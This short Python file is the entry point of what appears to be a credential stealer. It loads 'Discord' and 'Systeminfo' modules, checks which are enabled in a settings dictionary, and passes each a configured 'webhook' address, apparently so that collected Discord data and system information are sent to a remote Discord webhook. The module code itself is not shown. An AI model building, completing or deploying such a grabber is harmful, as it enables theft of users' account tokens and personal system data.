from config import __SETTINGS__

from functions.sdiscord import Discord
from functions.systeminfo import Systeminfo


def _main() -> None:
    funcs = [
        Discord, Systeminfo
    ]

    for func in funcs:
        if __SETTINGS__[func.__name__.lower()]:
            func(__SETTINGS__["webhook"])


if __name__ == "__main__":
    _main()
